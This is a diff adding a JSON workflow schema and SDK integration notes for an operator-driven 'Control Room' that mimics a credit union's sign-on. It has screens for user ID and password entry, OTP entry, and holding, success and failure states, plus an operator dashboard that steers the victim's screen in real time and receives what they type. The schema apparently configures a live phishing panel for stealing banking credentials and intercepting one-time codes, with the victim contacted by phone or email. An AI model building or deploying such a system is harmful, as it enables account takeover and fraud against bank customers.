@@ -1,0 +1,170 @@
+{
+  "_readme": "Control Room Workflow Schema — Send this file to your vendor's frontend team.",
+  "_error_handling": "Each state may have predefined_errors. Your UI should listen for 'operator_error' events and display the message. The operator can also send custom error strings not in this list.",
+  "workflow_id": "03d93d09-0f62-49fa-8258-3f90e2b63346",
+  "tenant_id": "9cc74a5e-7e82-4d54-9e67-44171adab094",
+  "name": "HarborStone Credit Union",
+  "description": "REF\nUser\nPass\n2fa\nsuccess\nfaliure",
+  "components_to_build": [
+    {
+      "component_key": "LoginForm",
+      "state_key": "login",
+      "label": "Login",
+      "is_initial": true,
+      "is_final": false,
+      "predefined_errors": [
+        "The User ID or Password you entered is incorrect.",
+        "This account has been temporarily locked.",
+        "Your session has expired. Please sign on again."
+      ]
+    },
+    {
+      "component_key": "OtpVerificationForm",
+      "state_key": "otp_verification",
+      "label": "OTP Verification",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": [
+        "The verification code is incorrect. Please try again.",
+        "Your code has expired. Please request a new one.",
+        "Too many attempts. Please wait and try again."
+      ]
+    },
+    {
+      "component_key": "ProcessingScreen",
+      "state_key": "processing",
+      "label": "Processing",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": []
+    },
+    {
+      "component_key": "SuccessScreen",
+      "state_key": "success",
+      "label": "Success",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    },
+    {
+      "component_key": "FailureScreen",
+      "state_key": "failure",
+      "label": "Failure",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    }
+  ],
+  "states": [
+    {
+      "state_key": "login",
+      "label": "Login",
+      "component_key": "LoginForm",
+      "is_initial": true,
+      "is_final": false,
+      "predefined_errors": [
+        "The User ID or Password you entered is incorrect.",
+        "This account has been temporarily locked.",
+        "Your session has expired. Please sign on again."
+      ]
+    },
+    {
+      "state_key": "otp_verification",
+      "label": "OTP Verification",
+      "component_key": "OtpVerificationForm",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": [
+        "The verification code is incorrect. Please try again.",
+        "Your code has expired. Please request a new one.",
+        "Too many attempts. Please wait and try again."
+      ]
+    },
+    {
+      "state_key": "processing",
+      "label": "Processing",
+      "component_key": "ProcessingScreen",
+      "is_initial": false,
+      "is_final": false,
+      "predefined_errors": []
+    },
+    {
+      "state_key": "success",
+      "label": "Success",
+      "component_key": "SuccessScreen",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    },
+    {
+      "state_key": "failure",
+      "label": "Failure",
+      "component_key": "FailureScreen",
+      "is_initial": false,
+      "is_final": true,
+      "predefined_errors": []
+    }
+  ],
+  "transitions": [
+    {
+      "from_state_key": "login",
+      "to_state_key": "otp_verification",
+      "event_type": "credentials_approved"
+    },
+    {
+      "from_state_key": "login",
+      "to_state_key": "processing",
+      "event_type": "hold_for_review"
+    },
+    {
+      "from_state_key": "login",
+      "to_state_key": "failure",
+      "event_type": "reject_permanently"
+    },
+    {
+      "from_state_key": "otp_verification",
+      "to_state_key": "success",
+      "event_type": "otp_verified"
+    },
+    {
+      "from_state_key": "otp_verification",
+      "to_state_key": "processing",
+      "event_type": "hold_for_review"
+    },
+    {
+      "from_state_key": "otp_verification",
+      "to_state_key": "failure",
+      "event_type": "reject_permanently"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "login",
+      "event_type": "resume_to_login"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "otp_verification",
+      "event_type": "resume_to_otp"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "success",
+      "event_type": "approve_complete"
+    },
+    {
+      "from_state_key": "processing",
+      "to_state_key": "failure",
+      "event_type": "reject_permanently"
+    }
+  ],
+  "sdk_integration": {
+    "setup": "1. Drop the provided `vendor-sdk.ts` file into your frontend repository's lib or utils folder.\n2. Install required dependencies: npm install @supabase/ssr @supabase/supabase-js",
+    "flow": [
+      "1. Operator creates a session in the Control Room dashboard → gets reference e.g. 'CR-250515-AB3F'",
+      "2. Operator gives reference to the end-user (phone call, email, etc.)",
+      "3. User enters reference on your website → your app calls session.connect(ref)",
+      "4. Operator controls the flow from dashboard → user's screen updates in real-time"
+    ],
+    "usage": "// Import the raw file directly (adjust path as needed)\nimport { ControlRoomSession } from '@/lib/vendor-sdk';\n\n// Initialize the SDK (once, on app load)\nconst session = new ControlRoomSession({\n  tenant_id: '9cc74a5e-7e82-4d54-9e67-44171adab094',\n  supabaseUrl: 'YOUR_SUPABASE_URL',\n  supabaseKey: 'YOUR_SUPABASE_PUBLISHABLE_KEY',\n});\n\n// When user enters their reference number:\nconst state = await session.connect(userEnteredReference);\n// state.component_key → which React component to render\n// state.current_state → the state machine key\n\n// Listen for operator actions (real-time)\nsession.subscribe((newState) => {\n  // Operator clicked 'Approve' or 'Next' → screen changes instantly\n  renderComponent(newState.component_key);\n});\n\n// Send user input to the operator's dashboard\nawait session.sendInput({ field_name: 'value' });"
+  }
+}
